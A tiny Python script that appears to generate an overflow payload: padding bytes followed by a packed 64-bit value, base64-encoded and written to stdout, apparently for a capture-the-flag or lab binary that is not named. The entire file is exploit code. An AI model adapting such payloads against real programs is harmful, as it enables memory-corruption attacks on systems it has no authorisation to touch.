
import sys
import struct
import base64

buf = b'rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr'
buf += struct.pack('<Q', 3699117454743318531)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
